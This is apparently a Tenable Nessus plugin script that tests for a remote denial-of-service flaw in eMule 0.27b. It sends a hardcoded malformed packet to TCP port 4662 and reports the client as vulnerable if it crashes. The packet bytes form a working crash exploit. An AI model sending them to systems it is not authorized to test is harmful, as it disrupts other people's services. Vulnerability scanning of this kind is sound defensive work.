#
# (C) Tenable Network Security, Inc.
#

# Ref:
#  Date: Tue, 25 Mar 2003 13:03:13 +0000
#  From: Auriemma Luigi <aluigi@pivx.com>
#  To: bugtraq@securityfocus.com
#  Subject: Emule 0.27b remote crash


include("compat.inc");

if(description)
{
 script_id(11473);
 script_version ("$Revision: 1.16 $");
 script_bugtraq_id(7189);
 script_osvdb_id(14322);

 script_name(english:"eMule Malformed Data Handling Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote P2P application is prone to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"It was possible to disable the remote eMule client by connecting to
this port and sending malformed data." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/316185" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to version 0.27c of eMule." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");


 script_set_attribute(attribute:"plugin_publication_date", value: "2003/03/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/03/25");
 script_cvs_date("$Date: 2011/03/11 21:52:32 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english: "Crashes the remote eMule client");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2003-2011 Tenable Network Security, Inc.");
 script_family(english:"Peer-To-Peer File Sharing");
 script_require_ports(4662);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");

port=4662;

if(! get_port_state(port)) exit(0, "TCP port "+port+" is closed.");
soc = open_sock_tcp(port);
if(! soc) exit(1, "Cannot connect to TCP port "+port+".");

   pkt = raw_string(
   0xE3, 0x24, 0x00, 0x00, 0x00, 0x01, 0x10, 0x00, 0x00, 
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
   0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00,
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
   0xE3, 0x03, 0x00, 0x00, 0x00, 0x4E, 0x00, 0x00);

  send(socket:soc, data:pkt);
  close(soc);
  
for(i = 0; i < 3; i ++)
{
 for (j = 1; j < 4; j ++)
 {
  soc = open_sock_tcp(port);
  if (soc) break;
  sleep(j);
 }
 if(! soc)
 {
   if (service_is_dead(port: port, exit: 1) > 0)
     security_warning(port);
   exit(0);
 }
 send(socket:soc, data:pkt);
 close(soc);
}
